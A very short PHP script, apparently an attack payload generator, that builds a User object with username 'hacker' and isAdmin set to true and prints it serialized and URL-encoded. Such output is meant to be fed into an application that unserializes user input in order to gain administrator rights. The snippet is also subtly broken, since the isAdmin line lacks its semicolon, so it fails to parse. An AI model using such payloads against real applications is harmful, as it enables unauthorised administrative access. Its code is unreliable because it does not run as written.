<?php
class User {
    public $username = "hacker";
    public $isAdmin = true
}
echo urlencode(serialize(new User()));
?>